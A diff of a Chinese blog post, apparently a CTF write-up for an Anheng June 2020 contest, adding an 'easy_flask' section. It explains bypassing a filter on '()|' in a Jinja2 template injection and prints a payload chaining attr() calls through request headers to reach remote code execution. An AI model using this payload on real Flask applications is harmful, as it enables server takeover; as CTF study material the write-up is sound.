@@ -84,7 +84,7 @@
             <h1>安恒6月赛Writeup</h1>
             <span class="meta">
             	Posted on
-              2020-06-26，3 min read
+              2020-06-26，4 min read
             </span>
           </div>
         </div>
@@ -199,6 +199,15 @@ def run():
 if __name__ == '__main__':
     run()
 </code></pre>
+<h1 id="easy_flask">easy_flask</h1>
+<p>ssti部分和安恒二月赛差不多。<br>
+就是把request.args.x1改成request.headers.x1<br>
+因为ban了()|。可以在结果外边多加一个()。变成整体。从而绕过()|。<br>
+也可以中间加个空格绕过()空格|<br>
+最后就是RCE了</p>
+<pre><code>{{()|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)()|attr(request.headers.x4)(398)|attr(request.headers.x5)|attr(request.headers.x6)|attr(request.headers.x4)(request.headers.x7)|attr(request.headers.x4)(request.headers.x8)(request.headers.x9)}}
+</code></pre>
+<p>复现的时候。环境关了。。。。。</p>
 
           
           <p class="next-post">下一篇：
